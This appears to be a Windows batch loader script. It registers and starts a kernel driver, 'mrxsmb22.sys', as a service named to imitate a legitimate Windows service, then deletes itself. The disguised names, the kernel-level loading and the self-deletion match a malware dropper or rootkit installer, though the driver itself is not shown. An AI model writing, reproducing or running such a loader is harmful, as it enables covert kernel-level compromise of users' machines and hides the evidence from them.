@echo off
cd %~dp0
sc create BcastDVRUserService914 binpath=C:\Windows\System32\drivers\mrxsmb22.sys type=kernel
sc start BcastDVRUserService914
del "%~f0"



